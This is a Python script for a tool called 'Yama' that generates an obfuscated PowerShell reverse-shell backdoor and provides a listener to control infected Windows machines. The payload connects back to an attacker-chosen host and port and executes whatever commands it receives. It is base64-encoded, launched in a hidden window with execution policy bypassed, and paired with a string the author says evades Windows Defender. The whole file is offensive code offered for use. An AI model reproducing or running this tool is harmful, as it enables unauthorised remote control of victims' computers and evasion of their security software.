#!/usr/bin/env python
#
# AUTHOR: Sub0
# VERSION: 1.0.0 [BETA]
# GITHUB: https://github.com/Sub0a
# DISCORD: sub0a
#
###############
#  LIBRARIES  #
###############
import os
import time
import socket
import base64
import argparse

YAMA_LOGO_BANNER = ("""

 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⠶⠿⢿⣿⣿⣿⣿⣷⣶⣶⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠋⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣴⣾⣿⣿⣿⣷⣶⣤⡈⠙⢿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⢿⣿⣿⣿⣿⣆⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⣿⣧⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢿⣿⣿⣿⣿⣇⠀⠀
 ⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢸⣿⣿⣿⣿⣿⡄⠀
 ⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢹⣿⣿⣿⣿⣿⣆⣠⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣷⠀
 ⠀⠀⢰⣶⡆⠀⠀⠀⠀⢀⣀⣀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣿⣿⣿⣿⣿⣿⡆
 ⢀⠀⢸⣿⣧⣰⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣾⣿⣿⣿⣿⣿⣿⣇
 ⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿
 ⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣈⠉⠛⠛⠛⠛⢉⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋
 ⣶⣌⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⣋⣥⣾⡿
 ⠙⢿⣿⣷⣶⣬⣙⡛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⢛⣉⣥⣴⣾⣿⣿⣿⣿⡇
 ⠀⠀⠙⣿⡟⢿⣿⣿⣿⣷⣶⣦⣬⣭⣉⣙⣛⣛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⢛⣛⣛⣋⣩⣭⣭⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
 ⠀⠀⠀⣿⡇⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
 ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
 ⠀⠀⠀⠀⠀⢠⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⢉⣭⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

 AUTHOR: @Sub0
 VERSION: 1.0.0 [BETA]
 GITHUB: https://github.com/Sub0a
 DISCORD: sub0a
""")

YAMA_MENU_BANNER = ("""
 ╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗
 ║>>> help          Show all commands of [Yama] software                               ║
 ║>>> listener      Start the listener of [YAMA] software                              ║
 ║>>> banner        Show the banner of [YAMA] software                                 ║
 ║>>> reset         Reset the appearance of [Yama] software                            ║
 ║>>> quit          Quit [Yama] software                                               ║
 ╚═════════════════════════════════════════════════════════════════════════════════════╝
""")

YAMA_LISTENER_BANNER = ("""
 ╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗
 ║>>> help          Show all commands of [Listener] tool                               ║
 ║>>> quit          Quit [Listener] tool                                               ║
 ╚═════════════════════════════════════════════════════════════════════════════════════╝
""")

def TEXT_DELAY(TEXT, DELAY):
    for CHAR in TEXT:
        print(CHAR, end='', flush=True)
        time.sleep(DELAY)
    print()

def BACKDOOR():
    print("")
    LHOST = input(" \033[97;1m╔═[LHOST] \n ╚═════════>>> ")
    print("")
    LPORT = input(" \033[97;1m╔═[LPORT] \n ╚═════════>>> ")

    PAYLOAD = f'''
 -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()"   
'''

    BACKDOOR_CODE = f'''
$encryptedPayload = "{PAYLOAD}";

function Decrypt-Payload($encryptedPayload) {{
    $b64Payload = [System.Convert]::FromBase64String($encryptedPayload)
    $plainPayload = [System.Text.Encoding]::UTF8.GetString($b64Payload)
    return $plainPayload
}}

# Fonction pour exécuter la commande
function Execute-Command($command){{
    $encodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
    $bypassDefenderCommand = "-win inputformat none (Get-Command 'Invoke-Expression').ScriptBlock.InvokeHide '#' sihk"
    $encodedCommand += " " + $bypassDefenderCommand
    Start-Process PowerShell -ArgumentList ('-NoProfile -ExecutionPolicy bypass -EncodedCommand {{0}}' -f $encodedCommand) -WindowStyle Hidden
}}

$payloadScript = Decrypt-Payload $encryptedPayload
Execute-Command $payloadScript 
'''
    
    PAYLOAD_OBFUSCATED = base64.b64encode(BACKDOOR_CODE.encode()).decode()
    
    BACKDOOR_RAW = PAYLOAD_OBFUSCATED
    return BACKDOOR_RAW
    
def LISTENER():

    os.system("clear")

    TEXT_DELAY(YAMA_LOGO_BANNER, 0.0005)
    TEXT_DELAY(YAMA_LISTENER_BANNER, 0.0005)

    LHOST = input(" \033[97;1m╔═[LHOST] \n ╚═════════>>> ")
    LPORT = input(" \033[97;1m╔═[LPORT] \n ╚═════════>>> ")

    LISTENER_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    LISTENER_SOCKET.bind((LHOST, int(LPORT)))
    LISTENER_SOCKET.listen(1)
    print(f" [...] Waiting for a connection on {LHOST}:{LPORT}")
    
    CONN, ADDR = LISTENER_SOCKET.accept()
    print(f" [...] Connection established from {ADDR[0]}:{ADDR[1]}")
    
    while True:
        print("")
        print(" ╔═[Listener]")
        print(" ╚═════════>", end=" ") 
        LISTENER_INPUT = input()
        
        if LISTENER_INPUT == "help":
           print(" [...] Show all commands of [Yama] software in progress...")
           time.sleep(2)
           TEXT_DELAY(YAMA_LISTENER_BANNER, 0.0005)
           time.sleep(10)
           LISTENER()
        
        if LISTENER_INPUT  == "quit":
           print(" [...] Quit [Listener] tool in progress...")
           time.sleep(2)
           CONN.send(LISTENER_INPUT.encode()) 
           CONN.close()
           break
            
        CONN.sendall(LISTENER_INPUT.encode())
        
        OUTPUT = CONN.recv(8192).decode()
        print(OUTPUT)

    LISTENER_SOCKET.close()

def YAMA():
    
    os.system("clear")
    
    TEXT_DELAY(YAMA_LOGO_BANNER, 0.0005)
    TEXT_DELAY(YAMA_MENU_BANNER, 0.0005)
    
    while True:
        print("")
        print(" [Use the 'help' command in the software]")
        print(" ╔═[Yama]")
        print(" ╚═════════>", end=" ") 
        YAMA_INPUT = input()
        
        if YAMA_INPUT == "help":
           print(" [...] Show all commands of [Yama] software in progress...")
           time.sleep(2)
           TEXT_DELAY(YAMA_MENU_BANNER, 0.0005)
           time.sleep(10)
           YAMA()
           
        if YAMA_INPUT == "listener":
           print(" [...] Start the listener of [YAMA] software in progress...")
           time.sleep(2)
           LISTENER()

        if YAMA_INPUT == "banner":
           print(" [...] Show the banner of [YAMA] software in progress...")
           time.sleep(2)
           TEXT_DELAY(YAMA_LOGO_BANNER, 0.0005)
           time.sleep(5)
           YAMA()
           
        if YAMA_INPUT == "reset":
           print(" [...] Reset the appearance of [Yama] software in progress...")
           time.sleep(2)
           YAMA()
        
        if YAMA_INPUT == "quit":
           print(" [...] Quit [Yama] software in progress...")
           time.sleep(2)
           os._exit(0)

def COMMANDS():
    PARSER = argparse.ArgumentParser(description="Generate a backdoor obfuscate FUD undetectable by Windows Defender")
    PARSER.add_argument("--generate", action="store_true", help="Generate a backdoor obfuscate FUD undetectable by Windows Defender")
    ARGS = PARSER.parse_args()

    if ARGS.generate:
        BACKDOOR_RAW = BACKDOOR()
        time.sleep(2)
        print("[...] Generation of the backdoor in progress...")
        print("powershell -e", BACKDOOR_RAW)
    else:
        YAMA()

COMMANDS()
